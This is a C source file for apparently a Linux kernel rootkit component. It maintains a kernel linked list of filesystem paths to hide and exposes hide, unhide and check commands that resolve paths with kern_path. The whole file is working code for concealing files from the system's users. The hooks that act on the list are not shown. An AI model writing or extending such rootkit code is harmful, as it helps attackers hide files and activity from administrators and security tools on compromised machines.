#include "../inc/cmds.h"
#include "../inc/util.h"

#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/slab.h>

struct hidden_path {
  struct path         path;
  struct hidden_path *next;
};

struct hide_status {
  struct hidden_path *head;
  uint64_t            count;
} hst = {
    .head  = NULL,
    .count = 0,
};

bool is_same_path(struct path *p1, struct path *p2) {
  struct dentry *d1 = p1->dentry;
  struct dentry *d2 = p2->dentry;

  if (p1->mnt != p2->mnt)
    return false;

  while ((NULL != d1 && !IS_ROOT(d1)) && (NULL != d2 && !IS_ROOT(d2))) {
    if (NULL == d1->d_name.name || NULL == d2->d_name.name)
      break;

    if (strcmp(d1->d_name.name, d2->d_name.name) != 0)
      return false;

    d1 = d1->d_parent;
    d2 = d2->d_parent;
  }

  if (NULL == d1 && NULL == d2)
    return true;

  if (IS_ROOT(d1) && IS_ROOT(d2))
    return true;

  return false;
}

bool is_path_hidden(struct path *p) {
  struct hidden_path *trav = hst.head;

  while (NULL != trav) {
    if (is_same_path(&trav->path, p))
      return true;
    trav = trav->next;
  }

  return false;
}

bool cmd_hide(char *arg, uint64_t len) {
  struct hidden_path *hp = NULL, *trav = NULL;

  if (NULL == (hp = kmalloc(sizeof(struct hidden_path), GFP_KERNEL))) {
    debg("failed to allocate space for the new hidden path (%s)", arg);
    return false;
  }

  memset(hp, 0, sizeof(struct hidden_path));

  // fails if the path does not exist
  if (kern_path(arg, LOOKUP_FOLLOW, &hp->path) != 0) {
    debg("failed to obtain the path from %s", arg);
    return false;
  }

  debg("hiding path: %s", arg);

  if (NULL == (trav = hst.head)) {
    hst.head = hp;
    hst.count++;
    return true;
  }

  while (NULL != trav->next)
    trav = trav->next;

  trav->next = hp;
  hst.count++;

  return true;
}

bool cmd_unhide(char *arg, uint64_t len) {
  struct hidden_path *pre = NULL, *trav = hst.head;
  struct path         path;

  if (kern_path(arg, LOOKUP_FOLLOW, &path) != 0) {
    debg("failed to obtain the path from %s", arg);
    return false;
  }

  debg("unhiding path: %s", arg);

  while (trav != NULL) {
    if (is_same_path(&trav->path, &path))
      break;

    pre  = trav;
    trav = trav->next;
  }

  if (NULL == trav)
    return true; // path not found

  if (NULL == pre)
    hst.head = trav->next;
  else
    pre->next = trav->next;

  hst.count--;
  kfree(trav);

  return true;
}

bool cmd_check(char *arg, uint64_t len) {
  struct hidden_path *trav = hst.head;
  struct path         path;

  if (kern_path(arg, LOOKUP_FOLLOW, &path) != 0) {
    debg("failed to obtain the path from %s", arg);
    return false;
  }

  debg("checking path: %s", arg);

  for (; trav != NULL; trav = trav->next)
    if (is_same_path(&trav->path, &path))
      return true;

  return false;
}
